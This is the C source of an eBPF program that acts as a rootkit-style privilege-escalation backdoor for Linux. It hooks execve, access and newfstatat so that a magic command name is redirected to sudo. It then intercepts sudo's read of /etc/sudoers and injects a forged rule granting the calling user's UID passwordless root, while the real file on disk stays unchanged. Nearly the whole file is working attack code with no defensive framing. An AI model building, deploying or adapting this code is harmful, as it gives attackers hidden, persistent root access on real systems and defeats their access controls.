// SPDX-License-Identifier: GPL-3.0
/*
    zsh/dash/busybox: execve
    bash/fish: execve && newfstatat && access

    when shell in interactive mode, bpf_probe_write_user will sometimes fail,
    use SHELL -c "COMMAND ARG1 ARG2" will have a better performance.
*/
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";
const __u8 value_u8_1 = 1;

#define MAGIC_ARGV0 "run_prog_as_root"
#define MAGIC_PATH "/usr/bin/run_prog_as_root"
#define SUDO_PATH "/usr/bin/sudo"

#define SUDOERS_NAME "sudoers"
#define SUDOERS_PATH "/etc/sudoers"
#define SUDOERS_FAKE_CONTENT1 "User_Alias HARUKA = #"
#define SUDOERS_UID_PADDING "          "
#define SUDOERS_FAKE_CONTENT2 "\nHARUKA ALL=(ALL:ALL) NOPASSWD:ALL\n"
#define SUDOERS_FAKE_CONTENT SUDOERS_FAKE_CONTENT1 SUDOERS_UID_PADDING SUDOERS_FAKE_CONTENT2
#define SUDOERS_PADDING "#"

#define CONST_STRLEN(x) (sizeof(x) - 1)
#define MIN(x, y) ((x) < (y) ? (x) : (y))
#define MAX(x, y) ((x) > (y) ? (x) : (y))

int my_pid = 0;

struct sys_enter_write_ctx {
    unsigned short common_type;
    unsigned char common_flags;
    unsigned char common_preempt_count;
    int common_pid;
    int __syscall_nr;
    char __pad0[4];
    unsigned int fd;
    const char * buf;
    size_t count;
};

struct sys_enter_execve_ctx {
    unsigned short common_type;
    unsigned char common_flags;
    unsigned char common_preempt_count;
    int common_pid;
    int __syscall_nr;
    char __pad0[4];
    const char* filename;
    const char* const* argv;
    const char* const* envp;
};

// struct sys_enter_openat_ctx {
//     unsigned short common_type;
//     unsigned char common_flags;
//     unsigned char common_preempt_count;
//     int common_pid;
//     int __syscall_nr;
//     char __pad0[4];
//     int dfd;
//     char* filename;
//     unsigned int flags;
//     umode_t mode;
// };

// struct sys_exit_openat_ctx {
//     unsigned short common_type;
//     unsigned char common_flags;
//     unsigned char common_preempt_count;
//     int common_pid;
//     int __syscall_nr;
//     char __pad0[4];
//     __s64 ret;
// };

struct sys_enter_read_ctx {
    unsigned short common_type;
    unsigned char common_flags;
    unsigned char common_preempt_count;
    int common_pid;
    int __syscall_nr;
    char __pad[4];
    unsigned int fd;
    char* buf;
    size_t count;
};

struct sys_exit_read_ctx {
    unsigned short common_type;
    unsigned char common_flags;
    unsigned char common_preempt_count;
    int common_pid;
    int __syscall_nr;
    char __pad[4];
    __s64 ret;
};

struct sys_enter_access_ctx {
    unsigned short common_type;
    unsigned char common_flags;
    unsigned char common_preempt_count;
    int common_pid;
    int __syscall_nr;
    char __pad[4];
    const char * filename;
    int mode;
};

struct sys_enter_newfstatat_ctx {
    unsigned short common_type;
    unsigned char common_flags;
    unsigned char common_preempt_count;
    int common_pid;
    int __syscall_nr;
    char __pad[4];
    int dfd;
    const char *filename;
    struct stat *statbuf;
    int flag;
};

struct priv_pids_t {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64); // thread group id(MSB) + pid (LSB)
    __type(value, __u8);
} priv_pids SEC(".maps");

// struct openat_sudoers_mark_t {
//     __uint(type, BPF_MAP_TYPE_HASH);
//     __uint(max_entries, 1024);
//     __type(key, __u64);
//     __type(value, __u8);
// } openat_sudoers_mark SEC(".maps");

struct access_mark_t {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, char *);
} access_mark SEC(".maps");

struct newfstatat_mark_t {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, char *);
} newfstatat_mark SEC(".maps");

struct fd_key_t {
    __u64 pid_tgid;
    unsigned int fd;
};

struct sudoers_fds_t {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, struct fd_key_t);
    __type(value, __u8);
} sudoers_fds SEC(".maps");

struct read_sudoers_param {
    char* buf;
    loff_t f_pos;
};

struct read_sudoers_params_t {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, struct read_sudoers_param);
} read_sudoers_params SEC(".maps");

static __always_inline int remove_from_priv_pids() {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    bpf_map_delete_elem(&priv_pids, &pid_tgid);
    return 0;
}

static __always_inline int strncmp(const char* s1, const char* s2, const int size){
    for (int i = 0; i <= size; i++)
        if (s1[i] != s2[i])
            return -1;
    return 0;
}

static __always_inline bool check_length(const char *s, int require_len) {
    for (int i = 0; i < require_len; i++)
        if (s[i] == '\0')
            return false;
    return true;
}

static __always_inline int itoa(__u64 v, char* s, int maxlen) {
    int len = 0;
    while (v != 0 && len < maxlen) {
        s[len++] = v % 10 + '0';
        v /= 10;
    }
    for (int i = 0; i < len / 2; i++) {
        char tmp = s[i];
        s[i] = s[len - i - 1];
        s[len - i - 1] = tmp;
    }
    return len;
}

SEC("tp/syscalls/sys_enter_execve")
int handle_enter_execve_tp(struct sys_enter_execve_ctx *ctx) {
    const char* argv0_ptr;
    char argv0[CONST_STRLEN(MAGIC_ARGV0) + 2];
    char filename[CONST_STRLEN(MAGIC_PATH) + 2];

    // static_assert(CONST_STRLEN(MAGIC_ARGV0) >= CONST_STRLEN(SUDO_PATH), "MAGIC_ARGV0 should not shorter than SUDO_PATH");
    // we handle command start with MAGIC_ARGV0
    if (ctx == NULL || ctx->argv == NULL)
        return remove_from_priv_pids();
    if (bpf_probe_read(&argv0_ptr, sizeof(argv0_ptr), &ctx->argv[0]) < 0)
        return remove_from_priv_pids();
    if (argv0_ptr == NULL)
        return remove_from_priv_pids();
    // read argv[0] and filename from user pointer
    bpf_probe_read_str(argv0, sizeof(argv0), argv0_ptr);
    // fill \x01, make sure bytes after filename_len != \0 != MAGIC_PATH[-1]
    __builtin_memset(filename, 1, sizeof(filename));
    int filename_len = bpf_probe_read_str(filename, sizeof(filename), ctx->filename);
    // bpf_printk("[sys_enter_execve] filename: %s, filename_len: %d\n", filename, filename_len);
    
    if ( filename_len != CONST_STRLEN(MAGIC_PATH) + 1 || strncmp(filename, MAGIC_PATH, CONST_STRLEN(MAGIC_PATH)))
        return remove_from_priv_pids();
    bpf_printk("[sys_enter_execve] filename: %s, argv[0]: %s\n", filename, argv0);
    // if (bpf_probe_write_user((void*)ctx->argv[0], SUDO_PATH, CONST_STRLEN(SUDO_PATH)) < 0) {
    //     bpf_printk("error writing to user memory: argv[0]\n");
    //     return -1;
    // }
    if (bpf_probe_write_user((void*)(ctx->filename), SUDO_PATH, CONST_STRLEN(SUDO_PATH) + 1) < 0) {
        bpf_printk("[sys_enter_execve] error writing to user memory: filename\n");
        return -1;
    }
    __u64 pid_tgid = bpf_get_current_pid_tgid();

    if (bpf_map_update_elem(&priv_pids, &pid_tgid, &value_u8_1, BPF_ANY) < 0) {
        bpf_printk("[sys_enter_execve] error updating priv_pids\n");
        return -1;
    }
    return 0;

}

SEC("tp/syscalls/sys_exit_exit_group")
int handle_exit_exitgroup_tp(void* ctx) {
    return remove_from_priv_pids();
}

SEC("tp/syscalls/sys_exit_exit")
int handle_exit_exit_tp(void* ctx) {
    return remove_from_priv_pids();
}

// SEC("tp/syscalls/sys_enter_openat")
// int handle_enter_openat_tp(struct sys_enter_openat_ctx* ctx) {
//     __u64 pid_tgid = bpf_get_current_pid_tgid();
//     if (!bpf_map_lookup_elem(&priv_pids, &pid_tgid))
//         return 0;
//     if (strncmp(ctx->filename, SUDOERS_PATH, CONST_STRLEN(SUDOERS_PATH)))
//         return 0;
//     if (bpf_map_update_elem(&openat_sudoers_mark, &pid_tgid, &value_u8_1, BPF_ANY) < 0) {
//         bpf_printk("[sys_enter_openat] error updating openat_sudoers_mark\n");
//         return -1;
//     }
//     return 0;
// }


// SEC("tp/syscalls/sys_exit_openat")
// int handle_exit_openat_tp(struct sys_exit_openat_ctx* ctx) {
//     __u64 pid_tgid = bpf_get_current_pid_tgid();
//     struct fd_key_t key = {
//         .pid_tgid = pid_tgid
//     };
//     if (!bpf_map_lookup_elem(&openat_sudoers_mark, &pid_tgid))
//         return 0;
    
//     if (bpf_map_delete_elem(&openat_sudoers_mark, &pid_tgid) < 0) {
//         bpf_printk("[sys_exit_openat] error deleting element in openat_sudoers_mark for %llu\n", pid_tgid);
//         return -1;
//     }
//     // negative or larger than MAX_INT
//     if (ctx->ret < 0 || ctx->ret >= (1LL<<31)) {
//         bpf_printk("[sys_exit_openat] sudoers open failed, ignore\n", pid_tgid);
//         return -1;
//     }
//     key.fd = ctx->ret;
//     if (bpf_map_update_elem(&sudoers_fds, &key, &value_u8_1, BPF_ANY) < 0) {
//         bpf_printk("[sys_exit_openat] error updating sudoers_fds\n", pid_tgid);
//         return -1;
//     }
//     return 0;
// }


SEC("tp/syscalls/sys_enter_read")
int handle_enter_read_tp(struct sys_enter_read_ctx *ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct task_struct *task;
    struct files_struct* f;
    struct fdtable* fdt;
    struct file** fdd;
    struct file* file;
    struct path path;
    struct dentry* dentry;
    struct qstr pathname;
    char filename[CONST_STRLEN(SUDOERS_PATH) + 2];
    int name_len;

    
    if (!bpf_map_lookup_elem(&priv_pids, &pid_tgid))
        return 0;
   
    task = (struct task_struct*)bpf_get_current_task();
    bpf_probe_read(&f, sizeof(f), (void*)&task->files);

    bpf_probe_read_kernel(&fdt, sizeof(fdt), (void*)&f->fdt);
    bpf_probe_read_kernel(&fdd, sizeof(fdd), (void*)&fdt->fd);
    bpf_probe_read_kernel(&file, sizeof(file), (void*)&fdd[ctx->fd]);
    bpf_probe_read_kernel(&path, sizeof(path), (const void*)&file->f_path);
    
    dentry = path.dentry;
    bpf_probe_read_kernel(&pathname, sizeof(pathname), (const void*)&dentry->d_name);
    bpf_probe_read_kernel_str((void*)filename, sizeof(filename), (const void*)pathname.name);

    // my kernel is not new enough
    // bpf_d_path(&path, filename, sizeof(filename));
    
    // bpf_printk("[sys_enter_read] filename: %20s\n", filename);

    if (strncmp(filename, SUDOERS_NAME, CONST_STRLEN(SUDOERS_NAME)))
        return 0;
    struct read_sudoers_param p = {
        .buf = ctx->buf,
    };

    bpf_probe_read_kernel(&p.f_pos, sizeof(p.f_pos), &file->f_pos);

    // bpf_printk("[sys_enter_read] buf: %p, f_pos: %lld\n", p.buf, p.f_pos);

    if (bpf_map_update_elem(&read_sudoers_params, &pid_tgid, &p, BPF_NOEXIST) < 0) {
        bpf_printk("[sys_enter_read] error updating read_sudoers_params\n");
        return -1;
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int handle_exit_read_tp(struct sys_exit_read_ctx *ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct read_sudoers_param *p;
    __s64 pos;
    char content[CONST_STRLEN(SUDOERS_FAKE_CONTENT) + 1];
    char uid[CONST_STRLEN(SUDOERS_UID_PADDING)];
    int uid_len = 0;
    int written_len;
    int copy_len1 = 0, copy_len2 = 0;
    
    __builtin_memset(uid, ' ', sizeof(uid));

    if (!bpf_map_lookup_elem(&priv_pids, &pid_tgid) || ctx->ret < 0)
        return 0;
    p = (struct read_sudoers_param*)bpf_map_lookup_elem(&read_sudoers_params, &pid_tgid);
    if (!p)
        return 0;
    if (p->buf == NULL) {
        bpf_printk("[sys_exit_read] p->buf == NULL.\n");
        return -1;
    }
    if (ctx->ret > 4096 || p->f_pos + ctx->ret < 0 || p->f_pos < 0) {
        bpf_printk("[sys_exit_read] read bytes too long: %lld\n", ctx->ret);
        return -1;
    }
    written_len = MIN(ctx->ret, 4096);
    uid_len = itoa(bpf_get_current_uid_gid() >> 32, uid, CONST_STRLEN(SUDOERS_UID_PADDING));
    __builtin_memcpy(content, SUDOERS_FAKE_CONTENT, CONST_STRLEN(SUDOERS_FAKE_CONTENT));
    __builtin_memcpy(content + CONST_STRLEN(SUDOERS_FAKE_CONTENT1), uid, CONST_STRLEN(SUDOERS_UID_PADDING));
    content[CONST_STRLEN(SUDOERS_FAKE_CONTENT)] = '\0';
    // bpf_printk("[sys_exit_read] content: %s\n", content);
    if (p->f_pos < CONST_STRLEN(SUDOERS_FAKE_CONTENT)) {
        copy_len1 = MIN(CONST_STRLEN(SUDOERS_FAKE_CONTENT) - p->f_pos, written_len);
        // because of ebpf loop limit, I can only write like this...
        for (int i = 0, j = 0; i < CONST_STRLEN(SUDOERS_FAKE_CONTENT); i++) {
            if (i < p->f_pos)
                continue;
            if (i >= copy_len1)
                break;
            bpf_probe_write_user(p->buf + j++, content + i, 1);
        }
    }

    // bpf_printk("[sys_exit_read] written: %d\n", written_len);
    // bpf_printk("[sys_exit_read] copy_len1: %d\n", copy_len1);

    if (p->f_pos + written_len > CONST_STRLEN(SUDOERS_FAKE_CONTENT)) {
        copy_len2 = MIN(p->f_pos + written_len - CONST_STRLEN(SUDOERS_FAKE_CONTENT), written_len);
        // bpf_printk("[sys_exit_read] copy_len2: %d\n", copy_len2);
        for (int i = 0; i < 4096; i++) {
            if (i >= copy_len2)
                break;
            bpf_probe_write_user(p->buf + copy_len1 + i, SUDOERS_PADDING, 1);
        }
    }
    
    // bpf_printk("[sys_exit_read] modified buf: %s\n", p->buf);

    if (bpf_map_delete_elem(&read_sudoers_params, &pid_tgid) < 0) {
        bpf_printk("[sys_exit_read] error deleting read_sudoers_params\n");
        return -1;
    }
    return 0;
}


// SEC("tp/syscalls/sys_enter_write")
// int handle_enter_write_tp(struct sys_enter_write_ctx *ctx) {
//     struct task_struct *task;
//     int pid = bpf_get_current_pid_tgid() >> 32;

//     if (pid != my_pid)
//     	return 0;
//     // bpf_printk("BPF triggered from PID %d.\n", pid);
//     // // bpf_printk("ctx[8:+4]  (syscall_nr) u32: %lx\n", *((__u32*)(((__u8*)ctx)+8)));
//     // // bpf_printk("ctx[16:+8] (dfd)        u64: %llx\n", *((__u64*)(((__u8*)ctx)+16)));
//     // // bpf_printk("ctx[24:+8] (filename)   u64: %p\n", *((char**)(((__u8*)ctx)+24)));
//     // // bpf_printk("ctx[32:+8] (flags)      u64: %llx\n", *((__u64*)(((__u8*)ctx)+32)));
//     // // bpf_printk("ctx[40:+8] (mode)       u64: %llx\n", *((__u64*)(((__u8*)ctx)+40)));

//     // bpf_printk("ctx[8:+4]  (syscall_nr) u32: %lx\n", *((__u32*)(((__u8*)ctx)+8)));
//     // bpf_printk("ctx[16:+8] (fd)         u64: %llx\n", *((__u64*)(((__u8*)ctx)+16)));
//     // bpf_printk("ctx[24:+8] (buf)        str: %s\n", *((char**)(((__u8*)ctx)+24)));
//     // bpf_printk("ctx[32:+8] (count)      u64: %llx\n", *((__u64*)(((__u8*)ctx)+32)));

//     // bpf_printk("buf: %s\n", ctx->buf);
//     return 0;
// }

/*
  The following code is for bash only, because bash will first use access && newfstatat to
  determine whether file exist.
*/
SEC("tp/syscalls/sys_enter_access")
int handle_enter_access_tp(struct sys_enter_access_ctx* ctx) {
    if (ctx == NULL)
        return 0;
    char filename[CONST_STRLEN(MAGIC_PATH) + 2];
    const char *filename_ptr = ctx->filename;
    bpf_probe_read_str(filename, sizeof(filename), ctx->filename);
    if (strncmp(filename, MAGIC_PATH, CONST_STRLEN(MAGIC_PATH)))
        return 0;
    if (bpf_probe_write_user((void*)(ctx->filename), SUDO_PATH, CONST_STRLEN(SUDO_PATH) + 1) < 0) {
        bpf_printk("[sys_enter_access] error writing to user memory: filename\n");
        return -1;
    }
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    if (bpf_map_update_elem(&access_mark, &pid_tgid, &filename_ptr, BPF_ANY) < 0) {
        bpf_printk("[sys_enter_access] error update access_mark\n");
        return -1;
    }
    
    return 0;
}


SEC("tp/syscalls/sys_exit_access")
int handle_exit_access_tp(void* ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    char **filename_ptr = (char **)bpf_map_lookup_elem(&access_mark, &pid_tgid);
    if (filename_ptr == NULL)
        return 0;
    char *filename = *filename_ptr;
    if (bpf_probe_write_user(filename, MAGIC_PATH, CONST_STRLEN(MAGIC_PATH) + 1) < 0) {
        bpf_printk("[sys_exit_access] error recovering filename\n");
        return -1;
    }
    if (bpf_map_delete_elem(&access_mark, &pid_tgid)) {
        bpf_printk("[sys_exit_access] error deleting elem in access_mark\n");
        return -1;
    }
    return 0;
}

SEC("tp/syscalls/sys_enter_newfstatat")
int handle_enter_newfstatat_tp(struct sys_enter_newfstatat_ctx* ctx) {
    if (ctx == NULL)
        return 0;
    char filename[CONST_STRLEN(MAGIC_PATH) + 2];
    const char *filename_ptr = ctx->filename;
    bpf_probe_read_str(filename, sizeof(filename), ctx->filename);
    if (strncmp(filename, MAGIC_PATH, CONST_STRLEN(MAGIC_PATH)))
        return 0;
    // bpf_printk("[sys_enter_newfstatat] filename: %s\n", ctx->filename);
    if (bpf_probe_write_user((void*)(ctx->filename), SUDO_PATH, CONST_STRLEN(SUDO_PATH) + 1) < 0) {
        bpf_printk("[sys_enter_newfstatat] error writing to user memory: filename\n");
        return -1;
    }
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    if (bpf_map_update_elem(&newfstatat_mark, &pid_tgid, &filename_ptr, BPF_ANY) < 0) {
        bpf_printk("[sys_enter_newfstatat] error update newfstatat_mark\n");
        return -1;
    }
    // bpf_printk("[sys_enter_newfstatat] edited: %s\n", ctx->filename);
    return 0;
}

SEC("tp/syscalls/sys_exit_newfstatat")
int handle_exit_newfstatat_tp(void* ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    char **filename_ptr = (char **)bpf_map_lookup_elem(&newfstatat_mark, &pid_tgid);
    if (filename_ptr == NULL)
        return 0;
    char *filename = *filename_ptr;
    // bpf_printk("[sys_exit_newfstatat] newfstatat_mark->filename: %s\n", filename);
    if (bpf_probe_write_user(filename, MAGIC_PATH, CONST_STRLEN(MAGIC_PATH) + 1) < 0) {
        bpf_printk("[sys_exit_newfstatat] error recovering filename\n");
        return -1;
    }
    // bpf_printk("[sys_exit_newfstatat] edited newfstatat_mark->filename: %s\n", filename);
    if (bpf_map_delete_elem(&newfstatat_mark, &pid_tgid)) {
        bpf_printk("[sys_exit_newfstatat] error deleting elem in newfstatat_mark\n");
        return -1;
    }
    return 0;
}